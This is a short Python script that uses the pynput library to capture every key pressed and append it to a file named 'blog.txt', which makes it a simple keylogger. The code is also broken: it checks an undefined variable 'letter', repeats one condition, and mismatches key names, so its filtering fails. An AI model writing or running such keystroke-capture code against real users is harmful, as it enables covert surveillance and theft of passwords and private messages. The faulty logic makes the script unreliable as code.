from pynput.keyboard import Listener 

def writetofile(key):
  keydata = str(key)
  keydata= keydata.replace("'","")

  if keydata=='key.space':
    keydata=''
  if keydata=='key.space':
      keydata=''
  if(letter == "Key.shift_r"):
        letter = ""
  if(letter == "Key.enter"):
        letter = "\n"

  with open("blog.txt",'a') as f :
    f.write(keydata)


with Listener(on_press=writetofile) as l:
  l.join() #single courts each letter and make sure key stroke join together
